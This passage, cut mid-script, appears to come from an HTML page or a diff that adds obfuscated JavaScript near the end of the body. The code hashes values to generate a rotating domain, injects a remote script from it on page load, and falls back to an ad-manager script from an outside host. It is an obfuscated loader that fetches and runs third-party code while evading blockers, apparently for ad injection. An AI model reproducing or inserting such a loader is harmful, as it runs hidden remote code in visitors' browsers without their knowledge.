5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
